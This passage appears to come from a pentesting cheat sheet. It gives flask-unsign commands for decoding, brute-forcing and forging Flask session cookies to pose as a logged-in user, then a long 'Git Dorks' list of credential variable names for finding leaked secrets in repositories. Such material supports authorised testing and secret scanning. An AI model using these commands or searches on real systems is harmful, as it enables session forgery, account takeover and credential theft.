$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### Brute Force

```console
$ flask-unsign --unsign --cookie < cookie.txt
```

### Unsigning a Cookie

```console
$ flask-unsign --unsign --no-literal-eval --wordlist /PATH/TO/WORDLIST/<FILE>.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZm9vYmFyIn0.Yq4QPw.0Hj2xCfDMJi7ksNfR4Oe9yN7nYQ
```

### Signing a Cookie

```console
$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USERNAME>'}"
```

### Signing a UUID Cookie

```console
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
$ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
```

## gf

> https://github.com/tomnomnom/gf

```console
$ go install github.com/tomnomnom/gf@latest
```

## Git Dorks

```console
GITHUB_TOKEN=
PATH=
CODECLIMATE_REPO_TOKEN=
DOCKER_PASSWORD=
NPM_TOKEN=
GH_TOKEN=
encrypted_02ddd67d5586_iv=
encrypted_517c5824cb79_key=
encrypted_02ddd67d5586_key=
encrypted_517c5824cb79_iv=
encrypted_1366e420413c_key=
encrypted_1366e420413c_iv=
DOCKER_USERNAME=
ARTIFACTS_SECRET=
ARTIFACTS_KEY=
SURGE_TOKEN=
SURGE_LOGIN=
ARTIFACTS_BUCKET=
SAUCE_ACCESS_KEY=
SAUCE_USERNAME=
DB_USER=
DB_PORT=
DB_HOST=
DBP=
javascriptEnabled=
acceptSslCerts=
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
DOCKER_EMAIL=
GH_USER_EMAIL=
GH_USER_NAME=
CLOUDINARY_URL=
COVERALLS_REPO_TOKEN=
CF_PASSWORD=
CF_SPACE=
CF_USERNAME=
CF_ORGANIZATION=
WPT_REPORT_API_KEY=
USABILLA_ID=
encrypted_17b59ce72ad7_key=
encrypted_17b59ce72ad7_iv=
NGROK_TOKEN=
rotatable=
CLOUDINARY_URL_STAGING=
encrypted_2c8d10c8cc1d_key=
encrypted_2c8d10c8cc1d_iv=
SRCCLR_API_TOKEN=
NPM_AUTH_TOKEN=
takesScreenshot=
GH_UNSTABLE_OAUTH_CLIENT_SECRET=
GH_OAUTH_CLIENT_SECRET=
GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET=
GH_UNSTABLE_OAUTH_CLIENT_ID=
GH_OAUTH_CLIENT_ID=
GH_NEXT_OAUTH_CLIENT_ID=
GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID=
GH_NEXT_OAUTH_CLIENT_SECRET=
marionette=
NPM_CONFIG_AUDIT=
FTP_PW=
FTP_LOGIN=
NPM_CONFIG_STRICT_SSL=
--ignore-ssl-errors=
TRAVIS_SECURE_ENV_VARS=
FOSSA_API_KEY=
VIP_GITHUB_DEPLOY_KEY=
SIGNING_KEY_SID=
SIGNING_KEY_SECRET=
ACCOUNT_SID=
API_KEY_SID=
API_KEY_SECRET=
CI_DEPLOY_PASSWORD=
CONFIGURATION_PROFILE_SID_SFU=
CONFIGURATION_PROFILE_SID_P2P=
ANACONDA_TOKEN=
CC_TEST_REPORTER_ID=
OS_TENANT_NAME=
OS_TENANT_ID=
OS_PROJECT_NAME=
OS_AUTH_URL=
OS_USERNAME=
OS_PASSWORD=
OS_REGION_NAME=
node_pre_gyp_secretAccessKey=
node_pre_gyp_accessKeyId=
encrypted_a2e547bcd39e_key=
encrypted_a2e547bcd39e_iv=
encrypted_17cf396fcb4f_key=
encrypted_17cf396fcb4f_iv=
datadog_api_key=
accessibilityChecks=
acceptInsecureCerts=
CI_DEPLOY_USERNAME=
cssSelectorsEnabled=
SONATYPE_PASSWORD=
tester_keys_password=
GITHUB_OAUTH_TOKEN=
webStorageEnabled=
locationContextEnabled=
nativeEvents=
handlesAlerts=
databaseEnabled=
browserConnectionEnabled=
applicationCacheEnabled=
hasTouchScreen=
takesHeapSnapshot=
networkConnectionEnabled=
mobileEmulationEnabled=
scope=
ALGOLIA_API_KEY=
encrypted_e05f6ccc270e_key=
encrypted_e05f6ccc270e_iv=
DANGER_GITHUB_API_TOKEN=
PYPI_PASSWORD=
VIP_GITHUB_BUILD_REPO_DEPLOY_KEY=
SSMTP_CONFIG=
COVERITY_SCAN_TOKEN=
CODECOV_TOKEN=
SIGNING_KEY=
GPG_ENCRYPTION=
NEW_RELIC_BETA_TOKEN=
ALGOLIA_APPLICATION_ID=
PACKAGECLOUD_TOKEN=
takesElementScreenshot=
raisesAccessibilityExceptions=
DOCKER_USER=
datadog_app_key=
encrypted_cb02be967bc8_key=
encrypted_cb02be967bc8_iv=
MAPBOX_ACCESS_TOKEN=
GITHUB_DEPLOYMENT_TOKEN=
ROPSTEN_PRIVATE_KEY=
RINKEBY_PRIVATE_KEY=
KOVAN_PRIVATE_KEY=
bintrayUser=
sonatypeUsername=
sonatypePassword=
bintrayKey=
SECRET_1=
SECRET_0=
SECRET_9=
SECRET_8=
SECRET_7=
SECRET_6=
SECRET_5=
SECRET_4=
SECRET_3=
SECRET_2=
SECRET_11=
SECRET_10=
TRAVIS_COM_TOKEN=
AWS_DEFAULT_REGION=
GITHUB_ACCESS_TOKEN=
PYPI_USERNAME=
BINTRAY_APIKEY=
BUNDLE_ZDREPO__JFROG__IO=
COCOAPODS_TRUNK_TOKEN=
OCTEST_SERVER_BASE_URL=
OCTEST_APP_USERNAME=
OCTEST_APP_PASSWORD=
OKTA_CLIENT_TOKEN=
HEROKU_API_KEY=
DATABASE_PASSWORD=
encrypted_0d22c88004c9_key=
encrypted_0d22c88004c9_iv=
BUNDLESIZE_GITHUB_TOKEN=
IOS_DOCS_DEPLOY_TOKEN=
COVERALLS_TOKEN=
CLOUDINARY_URL_EU=
HEROKU_API_USER=
OKTA_CLIENT_ORGURL=
VIRUSTOTAL_APIKEY=
PUSHOVER_USER=
PUSHOVER_TOKEN=
HB_CODESIGN_KEY_PASS=
HB_CODESIGN_GPG_PASS=
isbooleanGood=
BROWSER_STACK_USERNAME=
BROWSER_STACK_ACCESS_KEY=
SNYK_TOKEN=
rTwPXE9XlKoTn9FTWnAqF3MuWaLslDcDKYEh7OaYJjF01piu6g4Nc=
lr7mO294=
NtkUXxwH10BDMF7FMVlQ4zdHQvyZ0=
AURORA_STRING_URL=
TREX_OKTA_CLIENT_TOKEN=
TREX_OKTA_CLIENT_ORGURL=
GPG_PASSPHRASE=
encrypted_5d419efedfca_key=
encrypted_5d419efedfca_iv=
ACCESS_KEY_SECRET=
ACCESS_KEY_ID=
props.disabled=
ALGOLIA_API_KEY_MCM=
BINTRAY_API_KEY=
DOCKER_PASS=
TRIGGER_API_COVERAGE_REPORTER=
FIREBASE_TOKEN=
OSSRH_USERNAME=
7QHkRyCbP98Yv2FTXrJFcx9isA2viFx2UxzTsvXcAKHbCSAw=
dockerhubUsername=
dockerhubPassword=
SECRET_KEY_BASE=
repoToken=
encrypted_28c9974aabb6_key=
encrypted_28c9974aabb6_iv=
SONATYPE_USERNAME=
NGROK_AUTH_TOKEN=
FI2_SIGNING_SEED=
FI2_RECEIVING_SEED=
FI1_SIGNING_SEED=
FI1_RECEIVING_SEED=
CONTENTFUL_ORGANIZATION=
CONTENTFUL_ACCESS_TOKEN=
ANSIBLE_VAULT_PASSWORD=
FIREBASE_PROJECT=
ALGOLIA_SEARCH_API_KEY=
BINTRAY_USER=
encrypted_fb9a491fd14b_key=
encrypted_fb9a491fd14b_iv=
CODACY_PROJECT_TOKEN=
MANAGEMENT_TOKEN=
CONFIGURATION_PROFILE_SID=
NOW_TOKEN=
encrypted_90a9ca14a0f9_key=
encrypted_90a9ca14a0f9_iv=
IJ_REPO_USERNAME=
IJ_REPO_PASSWORD=
GITHUB_KEY=
pLytpSCciF6t9NqqGZYbBomXJLaG84=
encrypted_8a915ebdd931_key=
encrypted_8a915ebdd931_iv=
encrypted_0fb9444d0374_key=
encrypted_0fb9444d0374_iv=
encrypted_b98964ef663e_key=
encrypted_b98964ef663e_iv=
encrypted_50ea30db3e15_key=
encrypted_50ea30db3e15_iv=
SONAR_TOKEN=
API_KEY=
encrypted_a47108099c00_key=
encrypted_a47108099c00_iv=
OSSRH_SECRET=
GH_API_KEY=
PROJECT_CONFIG=
encrypted_f19708b15817_key=
encrypted_f19708b15817_iv=
encrypted_568b95f14ac3_key=
encrypted_568b95f14ac3_iv=
encrypted_4664aa7e5e58_key=
encrypted_4664aa7e5e58_iv=
ORG_GRADLE_PROJECT_SONATYPE_NEXUS_USERNAME=
ORG_GRADLE_PROJECT_SONATYPE_NEXUS_PASSWORD=
encrypted_54c63c7beddf_key=
encrypted_54c63c7beddf_iv=
CONTENTFUL_INTEGRATION_SOURCE_SPACE=
CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN=
BLUEMIX_API_KEY=
UzhH1VoXksrNQkFfc78sGxD0VzLygdDJ7RmkZPeBiHfX1yilToi1yrlRzRDLo46LvSEEiawhTa1i9W3UGr3p4LNxOxJr9tR9AjUuIlP21VEooikAhRf35qK0=
ALGOLIA_APP_ID_MCM=
MAILGUN_PUB_KEY=
MAILGUN_PRIV_KEY=
MAILGUN_DOMAIN=
ALGOLIA_APPLICATION_ID_MCM=
encrypted_1528c3c2cafd_key=
encrypted_1528c3c2cafd_iv=
CASPERJS_TIMEOUT=
COS_SECRETS=
ATOKEN=
PASSWORD=
GITHUB_DEPLOY_HB_DOC_PASS=
COVERITY_SCAN_NOTIFICATION_EMAIL=
CONTENTFUL_CMA_TEST_TOKEN=
DOCKER=
5oLiNgoXIh3jFmLkXfGabI4MvsClZb72onKlJs8WD7VkusgVOrcReD1vkAMv7caaO4TqkMAAuShXiks2oFI5lpHSz0AE1BaI1s6YvwHQFlxbSQJprJd4eeWS9l78mYPJhoLRaWbvf0qIJ29mDSAgAJ7XI=
Q67fq4bD04RMM2RJAS6OOYaBF1skYeJCblwUk=
COVERALLS_API_TOKEN=
MapboxAccessToken=
FIREBASE_API_TOKEN=
TWINE_PASSWORD=
0dysAuQ5KQk=
USERNAME=
encrypted_91ee6a0187b8_key=
encrypted_91ee6a0187b8_iv=
OSSRH_PASS=
OSSRH_USER=
setWindowRect=
SCRUTINIZER_TOKEN=
CLUSTER_NAME=
OC_PASS=
APP_NAME=
GITHUB_API_KEY=
COCOAPODS_TRUNK_EMAIL=
ORG_ID=
OSSRH_JIRA_USERNAME=
OSSRH_JIRA_PASSWORD=
DH_END_POINT_1=
CI_DEPLOY_USER=
CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN=
WEBHOOK_URL=
SLACK_CHANNEL=
APIARY_API_KEY=
=
SONATYPE_USER=
TWINE_USERNAME=
WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY=
SONAR_ORGANIZATION_KEY=
DEPLOY_USER=
SONAR_PROJECT_KEY=
ZZiigPX7RCjq5XHbzUpPpMbC8MFxT2K3jcFXUitfwZvNaZXJIiK3ZQJU4ayKaegLvI91x1SqH0=
encrypted_2620db1da8a0_key=
encrypted_2620db1da8a0_iv=
CLIENT_ID=
AWS_REGION=
AWS_S3_BUCKET=
encrypted_2fb4f9166ccf_key=
encrypted_2fb4f9166ccf_iv=
EXP_USERNAME=
EXP_PASSWORD=
TRAVIS_TOKEN=
ALGOLIA_APPLICATION_ID_2=
ALGOLIA_APPLICATION_ID_1=
ALGOLIA_ADMIN_KEY_2=
ALGOLIA_ADMIN_KEY_1=
PAYPAL_CLIENT_SECRET=
PAYPAL_CLIENT_ID=
EMAIL_NOTIFICATION=
BINTRAY_KEY=
BRACKETS_REPO_OAUTH_TOKEN=
PLACES_APPLICATION_ID=
PLACES_API_KEY=
ARGOS_TOKEN=
encrypted_f50468713ad3_key=
encrypted_f50468713ad3_iv=
EXPORT_SPACE_ID=
encrypted_e44c58426490_key=
encrypted_e44c58426490_iv=
ALGOLIA_APP_ID=
GPG_KEYNAME=
SVN_USER=
SVN_PASS=
ENCRYPTION_PASSWORD=
SPOTIFY_API_CLIENT_SECRET=
SPOTIFY_API_CLIENT_ID=
SPOTIFY_API_ACCESS_TOKEN=
env.HEROKU_API_KEY=
COMPONENT=
URL=
STAR_TEST_SECRET_ACCESS_KEY=
STAR_TEST_LOCATION=
STAR_TEST_BUCKET=
STAR_TEST_AWS_ACCESS_KEY_ID=
ARTIFACTS_AWS_SECRET_ACCESS_KEY=
ARTIFACTS_AWS_ACCESS_KEY_ID=
encrypted_ce33e47ba0cf_key=
encrypted_ce33e47ba0cf_iv=
DEPLOY_DIR=
GITHUB_USERNAME=
aos_sec=
aos_key=
UNITY_USERNAME=
UNITY_SERIAL=
UNITY_PASSWORD=
SONATYPE_NEXUS_PASSWORD=
OMISE_SKEY=
OMISE_PKEY=
GPG_NAME=
GPG_EMAIL=
DOCKER_HUB_PASSWORD=
encrypted_8496d53a6fac_key=
encrypted_8496d53a6fac_iv=
SONATYPE_NEXUS_USERNAME=
CLI_E2E_ORG_ID=
CLI_E2E_CMA_TOKEN=
-DskipTests=
encrypted_42359f73c124_key=
encrypted_42359f73c124_iv=
encrypted_c2c0feadb429_key=
encrypted_c2c0feadb429_iv=
SANDBOX_LOCATION_ID=
SANDBOX_ACCESS_TOKEN=
LOCATION_ID=
ACCESS_TOKEN=
encrypted_f9be9fe4187a_key=
encrypted_f9be9fe4187a_iv=
OSSRH_PASSWORD=
ibCWoWs74CokYVA=
REGISTRY=
GH_REPO_TOKEN=
a=
-Dmaven.javadoc.skip=
CLIENT_SECRET=
encrypted_e7ed02806170_key=
encrypted_e7ed02806170_iv=
ensureCleanSession=
HOCKEYAPP_TOKEN=
GITHUB_AUTH=
uk=
encrypted_fb94579844cb_key=
encrypted_fb94579844cb_iv=
env.SONATYPE_USERNAME=
env.SONATYPE_PASSWORD=
env.GITHUB_OAUTH_TOKEN=
BLUEMIX_USER=
6EpEOjeRfE=
SALESFORCE_BULK_TEST_USERNAME=
SALESFORCE_BULK_TEST_SECURITY_TOKEN=
SALESFORCE_BULK_TEST_PASSWORD=
p8qojUzqtAhPMbZ8mxUtNukUI3liVgPgiMss96sG0nTVglFgkkAkEjIMFnqMSKnTfG812K4jIhp2jCO2Q3NeI=
NPM_API_KEY=
SONATYPE_PASS=
GITHUB_HUNTER_USERNAME=
GITHUB_HUNTER_TOKEN=
SLASH_DEVELOPER_SPACE_KEY=
SLASH_DEVELOPER_SPACE=
0PYg1Q6Qa8BFHJDZ0E8F4thnPFDb1fPnUVIgfKmkE8mnLaQoO7JTHuvyhvyDA=
CYPRESS_RECORD_KEY=
DOCKER_KEY=
encrypted_e733bc65337f_key=
encrypted_e733bc65337f_iv=
GPG_KEY_NAME=
encrypted_0d261e9bbce3_key=
encrypted_0d261e9bbce3_iv=
CI_NAME=
NETLIFY_SITE_ID=
NETLIFY_API_KEY=
encrypted_90a1b1aba54b_key=
encrypted_90a1b1aba54b_iv=
GITHUB_USER=
CLOUDANT_USERNAME=
CLOUDANT_PASSWORD=
EZiLkw9g39IgxjDsExD2EEu8U9jyz8iSmbKsrK6Z4L3BWO6a0gFakBAfWR1Rsb15UfVPYlJgPwtAdbgQ65ElgVeyTdkDCuE64iby2nZeP4=
CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW=
HOMEBREW_GITHUB_API_TOKEN=
GITHUB_PWD=
HUB_DXIA2_PASSWORD=
encrypted_830857fa25dd_key=
encrypted_830857fa25dd_iv=
GCLOUD_PROJECT=
GCLOUD_BUCKET=
FBTOOLS_TARGET_PROJECT=
ALGOLIA_API_KEY_SEARCH=
SENTRY_ENDPOINT=
SENTRY_DEFAULT_ORG=
SENTRY_AUTH_TOKEN=
GITHUB_OAUTH=
FIREBASE_PROJECT_DEVELOP=
DDGC_GITHUB_TOKEN=
INTEGRATION_TEST_APPID=
INTEGRATION_TEST_API_KEY=
OFTA_SECRET=
OFTA_REGION=
OFTA_KEY=
encrypted_27a1e8612058_key=
encrypted_27a1e8612058_iv=
AMAZON_SECRET_ACCESS_KEY=
ISSUER=
REPORTING_WEBDAV_USER=
REPORTING_WEBDAV_URL=
REPORTING_WEBDAV_PWD=
SLACK_ROOM=
encrypted_36455a09984d_key=
encrypted_36455a09984d_iv=
DOCKER_HUB_USERNAME=
CACHE_URL=
TEST=
S3_KEY=
ManagementAPIAccessToken=
encrypted_62cbf3187829_key=
encrypted_62cbf3187829_iv=
BLUEMIX_PASS=
encrypted_0c03606c72ea_key=
encrypted_0c03606c72ea_iv=
uiElement=
NPM_EMAIL=
GITHUB_AUTH_TOKEN=
SLACK_WEBHOOK_URL=
LIGHTHOUSE_API_KEY=
DOCKER_PASSWD=
github_token=
APP_ID=
CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN=
encrypted_585e03da75ed_key=
encrypted_585e03da75ed_iv=
encrypted_8382f1c42598_key=
encrypted_8382f1c42598_iv=
CLOUDANT_INSTANCE=
PLOTLY_USERNAME=
PLOTLY_APIKEY=
MAILGUN_TESTDOMAIN=
MAILGUN_PUB_APIKEY=
MAILGUN_APIKEY=
LINODE_VOLUME_ID=
LINODE_INSTANCE_ID=
CLUSTER=
--org=
GPG_SECRET_KEYS=
GPG_OWNERTRUST=
GITHUB_PASSWORD=
DOCKERHUB_PASSWORD=
zenSonatypeUsername=
zenSonatypePassword=
NODE_PRE_GYP_GITHUB_TOKEN=
encrypted_fc666da9e2f5_key=
encrypted_fc666da9e2f5_iv=
encrypted_afef0992877c_key=
encrypted_afef0992877c_iv=
BLUEMIX_AUTH=
encrypted_dd05710e44e2_key=
encrypted_dd05710e44e2_iv=
OPEN_WHISK_KEY=
encrypted_99b9b8976e4b_key=
encrypted_99b9b8976e4b_iv=
FEEDBACK_EMAIL_SENDER=
FEEDBACK_EMAIL_RECIPIENT=
KEY=
NPM_SECRET_KEY=
SLATE_USER_EMAIL=
encrypted_ad766d8d4221_key=
encrypted_ad766d8d4221_iv=
SOCRATA_PASSWORD=
&key=
APPLICATION_ID=
--port=
--host=
ITEST_GH_TOKEN=
encrypted_c40f5907e549_key=
encrypted_c40f5907e549_iv=
BX_USERNAME=
BX_PASSWORD=
AUTH=
APIGW_ACCESS_TOKEN=
encrypted_cb91100d28ca_key=
encrypted_cb91100d28ca_iv=
encrypted_973277d8afbb_key=
encrypted_973277d8afbb_iv=
YT_SERVER_API_KEY=
TOKEN=
SUBDOMAIN=
END_USER_USERNAME=
END_USER_PASSWORD=
SENDGRID_FROM_ADDRESS=
SENDGRID_API_KEY=
OPENWHISK_KEY=
SONATYPE_TOKEN_USER=
SONATYPE_TOKEN_PASSWORD=
BINTRAY_GPG_PASSWORD=
GITHUB_RELEASE_TOKEN=
?AccessKeyId=
MAGENTO_AUTH_USERNAME=
MAGENTO_AUTH_PASSWORD=
YT_ACCOUNT_REFRESH_TOKEN=
YT_ACCOUNT_CHANNEL_ID=
encrypted_989f4ea822a6_key=
encrypted_989f4ea822a6_iv=
NPM_API_TOKEN=
?access_token=
encrypted_0dfb31adf922_key=
encrypted_0dfb31adf922_iv=
YT_PARTNER_REFRESH_TOKEN=
YT_PARTNER_ID=
YT_PARTNER_CLIENT_SECRET=
YT_PARTNER_CLIENT_ID=
YT_PARTNER_CHANNEL_ID=
YT_ACCOUNT_CLIENT_SECRET=
YT_ACCOUNT_CLIENT_ID=
encrypted_9c67a9b5e4ea_key=
encrypted_9c67a9b5e4ea_iv=
REGISTRY_PASS=
KAFKA_REST_URL=
FIREBASE_API_JSON=
CLAIMR_TOKEN=
VISUAL_RECOGNITION_API_KEY=
encrypted_c494a9867e56_key=
encrypted_c494a9867e56_iv=
SPA_CLIENT_ID=
GH_OAUTH_TOKEN=
encrypted_96e73e3cb232_key=
encrypted_96e73e3cb232_iv=
encrypted_2acd2c8c6780_key=
encrypted_2acd2c8c6780_iv=
SPACE=
ORG=
--branch=
DEPLOY_PASSWORD=
&pr=
CLAIMR_DATABASE=
-DSELION_SELENIUM_RUN_LOCALLY=
?id=
SELION_SELENIUM_USE_SAUCELAB_GRID=
SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE=
SELION_SELENIUM_PORT=
SELION_SELENIUM_HOST=
SELION_LOG_LEVEL_USER=
SELION_LOG_LEVEL_DEV=
qQ=
encrypted_7b8432f5ae93_key=
encrypted_7b8432f5ae93_iv=
Yszo3aMbp2w=
YVxUZIA4Cm9984AxbYJGSk=
OKTA_DOMAIN=
DROPLET_TRAVIS_PASSWORD=
BLUEMIX_PWD=
BLUEMIX_ORGANIZATION=
--username=
--password=
java.net.UnknownHostException=
REFRESH_TOKEN=
encrypted_096b9faf3cb6_key=
encrypted_096b9faf3cb6_iv=
APP_SETTINGS=
VAULT_PATH=
VAULT_APPROLE_SECRET_ID=
VAULT_ADDR=
encrypted_00000eb5a141_key=
encrypted_00000eb5a141_iv=
FOO=
MANDRILL_API_KEY=
xsax=
fvdvd=
csac=
cdascsa=
cacdc=
c=
aaaaaaa=
SOME_VAR=
SECRET=
3FvaCwO0TJjLU1b0q3Fc=
2bS58p9zjyPk7aULCSAF7EUlqT041QQ5UBJV7gpIxFW1nyD6vL0ZBW1wA1k1PpxTjznPA=
V_SFDC_USERNAME=
V_SFDC_PASSWORD=
V_SFDC_CLIENT_SECRET=
V_SFDC_CLIENT_ID=
QUIP_TOKEN=
ENV_SDFCAcctSDO_QuipAcctVineetPersonal=
APPLICATION_ID_MCM=
API_KEY_MCM=
GOOGLE_MAPS_API_KEY=
encrypted_00fae8efff8c_key=
encrypted_00fae8efff8c_iv=
GIT_COMMITTER_EMAIL=
GIT_AUTHOR_EMAIL=
V3GNcE1hYg=
8o=
encrypted_16c5ae3ffbd0_key=
encrypted_16c5ae3ffbd0_iv=
INDEX_NAME=
casc=
TREX_CLIENT_TOKEN=
TREX_CLIENT_ORGURL=
encrypted_d9a888dfcdad_key=
encrypted_d9a888dfcdad_iv=
REGISTRY_USER=
NUGET_API_KEY=
4QzH4E3GyaKbznh402E=
key=
BLUEMIX_SPACE=
BLUEMIX_ORG=
ALGOLIA_ADMIN_KEY_MCM=
clojars_username=
clojars_password=
SPACES_SECRET_ACCESS_KEY=
encrypted_17d5860a9a31_key=
encrypted_17d5860a9a31_iv=
DH_END_POINT_2=
SPACES_ACCESS_KEY_ID=
ISDEVELOP=
MAGENTO_USERNAME=
MAGENTO_PASSWORD=
TRAVIS_GH_TOKEN=
encrypted_b62a2178dc70_key=
encrypted_b62a2178dc70_iv=
encrypted_54792a874ee7_key=
encrypted_54792a874ee7_iv=
PLACES_APPID=
PLACES_APIKEY=
GITHUB_AUTH_USER=
BLUEMIX_REGION=
SNOOWRAP_USER_AGENT=
SNOOWRAP_USERNAME=
SNOOWRAP_REFRESH_TOKEN=
SNOOWRAP_PASSWORD=
SNOOWRAP_CLIENT_SECRET=
SNOOWRAP_CLIENT_ID=
OKTA_AUTHN_ITS_MFAENROLLGROUPID=
SOCRATA_USERNAME=
SOCRATA_APP_TOKEN=
NEXUS_USERNAME=
NEXUS_PASSWORD=
CLAIMR_SUPERUSER=
encrypted_c6d9af089ec4_key=
encrypted_c6d9af089ec4_iv=
encrypted_7f6a0d70974a_key=
encrypted_7f6a0d70974a_iv=
LOTTIE_UPLOAD_CERT_KEY_STORE_PASSWORD=
LOTTIE_UPLOAD_CERT_KEY_PASSWORD=
LOTTIE_S3_SECRET_KEY=
LOTTIE_S3_API_KEY=
LOTTIE_HAPPO_SECRET_KEY=
LOTTIE_HAPPO_API_KEY=
GRADLE_SIGNING_PASSWORD=
GRADLE_SIGNING_KEY_ID=
GCLOUD_SERVICE_KEY=
cluster=
WPORG_PASSWORD=
ZHULIANG_GH_TOKEN=
USE_SAUCELABS=
user=
password=
encrypted_22fd8ae6a707_key=
encrypted_22fd8ae6a707_iv=
DEPLOY_TOKEN=
ALGOLIA_SEARCH_KEY_1=
WEB_CLIENT_ID=
SNYK_ORG_ID=
SNYK_API_TOKEN=
POLL_CHECKS_TIMES=
POLL_CHECKS_CRON=
OBJECT_STORAGE_USER_ID=
OBJECT_STORAGE_REGION_NAME=
OBJECT_STORAGE_PROJECT_ID=
OBJECT_STORAGE_PASSWORD=
OBJECT_STORAGE_INCOMING_CONTAINER_NAME=
CLOUDANT_PROCESSED_DATABASE=
CLOUDANT_PARSED_DATABASE=
CLOUDANT_AUDITED_DATABASE=
CLOUDANT_ARCHIVED_DATABASE=
encrypted_b0a304ce21a6_key=
encrypted_b0a304ce21a6_iv=
THERA_OSS_ACCESS_KEY=
THERA_OSS_ACCESS_ID=
REGISTRY_SECURE=
OKTA_OAUTH2_ISSUER=
OKTA_OAUTH2_CLIENT_SECRET=
OKTA_OAUTH2_CLIENT_ID=
OKTA_OAUTH2_CLIENTSECRET=
OKTA_OAUTH2_CLIENTID=
DEPLOY_SECURE=
CERTIFICATE_PASSWORD=
CERTIFICATE_OSX_P12=
encrypted_a0bdb649edaa_key=
encrypted_a0bdb649edaa_iv=
encrypted_9e70b84a9dfc_key=
encrypted_9e70b84a9dfc_iv=
WATSON_USERNAME=
WATSON_TOPIC=
WATSON_TEAM_ID=
WATSON_PASSWORD=
WATSON_DEVICE_TOPIC=
WATSON_DEVICE_PASSWORD=
WATSON_DEVICE=
WATSON_CLIENT=
STAGING_BASE_URL_RUNSCOPE=
RUNSCOPE_TRIGGER_ID=
PROD_BASE_URL_RUNSCOPE=
GHOST_API_KEY=
EMAIL=
CLOUDANT_SERVICE_DATABASE=
CLOUDANT_ORDER_DATABASE=
CLOUDANT_APPLIANCE_DATABASE=
CF_PROXY_HOST=
ALARM_CRON=
encrypted_71f1b33fe68c_key=
encrypted_71f1b33fe68c_iv=
NUGET_APIKEY=
encrypted_6342d3141ac0_key=
encrypted_6342d3141ac0_iv=
SONATYPE_GPG_PASSPHRASE=
encrypted_218b70c0d15d_key=
encrypted_218b70c0d15d_iv=
encrypted_15377b0fdb36_key=
encrypted_15377b0fdb36_iv=
ZOPIM_ACCOUNT_KEY=
SOCRATA_USER=
RTD_STORE_PASS=
RTD_KEY_PASS=
RTD_ALIAS=
encrypted_7df76fc44d72_key=
encrypted_7df76fc44d72_iv=
encrypted_310f735a6883_key=
encrypted_310f735a6883_iv=
WINCERT_PASSWORD=
PAT=
DDG_TEST_EMAIL_PW=
DDG_TEST_EMAIL=
encrypted_d363c995e9f6_key=
encrypted_d363c995e9f6_iv=
-DdbUrl=
WsleZEJBve7AFYPzR1h6Czs072X4sQlPXedcCHRhD48WgbBX0IfzTiAYCuG0=
WORKSPACE_ID=
REDIRECT_URI=
PREBUILD_AUTH=
MAVEN_STAGING_PROFILE_ID=
LOGOUT_REDIRECT_URI=
BUNDLE_GEMS__CONTRIBSYS__COM=
mailchimp_user=
mailchimp_list_id=
mailchimp_api_key=
SONATYPE_GPG_KEY_NAME=
encrypted_06a58c71dec3_key=
encrypted_06a58c71dec3_iv=
S3_USER_SECRET=
S3_USER_ID=
Hso3MqoJfx0IdpnYbgvRCy8zJWxEdwJn2pC4BoQawJx8OgNSx9cjCuy6AH93q2zcQ=
FTP_USER=
FTP_PASSWORD=
DOCKER_TOKEN=
BINTRAY_TOKEN=
ADZERK_API_KEY=
encrypted_a2f0f379c735_key=
encrypted_a2f0f379c735_iv=
encrypted_a8a6a38f04c1_key=
encrypted_a8a6a38f04c1_iv=
BLUEMIX_NAMESPACE=
udKwT156wULPMQBacY=
MYSQL_USERNAME=
MYSQL_PASSWORD=
MYSQL_HOSTNAME=
MYSQL_DATABASE=
CHEVERNY_TOKEN=
APP_TOKEN=
RELEASE_GH_TOKEN=
android_sdk_preview_license=
android_sdk_license=
GIT_TOKEN=
ALGOLIA_SEARCH_KEY=
token=
gateway=
cred=
USER=
SRC_TOPIC=
KAFKA_ADMIN_URL=
DEST_TOPIC=
ANDROID_DOCS_DEPLOY_TOKEN=
encrypted_d1b4272f4052_key=
encrypted_d1b4272f4052_iv=
encrypted_5704967818cd_key=
encrypted_5704967818cd_iv=
BROWSERSTACK_USERNAME=
BROWSERSTACK_ACCESS_KEY=
encrypted_125454aa665c_key=
encrypted_125454aa665c_iv=
encrypted_d7b8d9290299_key=
encrypted_d7b8d9290299_iv=
PRIVATE_SIGNING_PASSWORD=
DANGER_VERBOSE=
encrypted_1a824237c6f8_key=
encrypted_1a824237c6f8_iv=
encrypted_1ab91df4dffb_key=
encrypted_1ab91df4dffb_iv=
BLUEMIX_USERNAME=
BLUEMIX_PASSWORD=
webdavBaseUrlTravis=
userTravis=
userToShareTravis=
remoteUserToShareTravis=
passwordTravis=
groupToShareTravis=
baseUrlTravis=
encrypted_cfd4364d84ec_key=
encrypted_cfd4364d84ec_iv=
MG_URL=
MG_SPEND_MONEY=
MG_PUBLIC_API_KEY=
MG_EMAIL_TO=
MG_EMAIL_ADDR=
MG_DOMAIN=
MG_API_KEY=
encrypted_50a936d37433_key=
encrypted_50a936d37433_iv=
ORG_GRADLE_PROJECT_cloudinaryUrl=
encrypted_5961923817ae_key=
encrypted_5961923817ae_iv=
GITHUB_API_TOKEN=
HOST=
encrypted_e1de2a468852_key=
encrypted_e1de2a468852_iv=
encrypted_44004b20f94b_key=
encrypted_44004b20f94b_iv=
YHrvbCdCrtLtU=
SNOOWRAP_REDIRECT_URI=
PUBLISH_KEY=
IMAGE=
-DSELION_DOWNLOAD_DEPENDENCIES=
sdr-token=
encrypted_6cacfc7df997_key=
encrypted_6cacfc7df997_iv=
OKTA_CLIENT_ORG_URL=
BUILT_BRANCH_DEPLOY_KEY=
AGFA=
encrypted_e0bbaa80af07_key=
encrypted_e0bbaa80af07_iv=
encrypted_cef8742a9861_key=
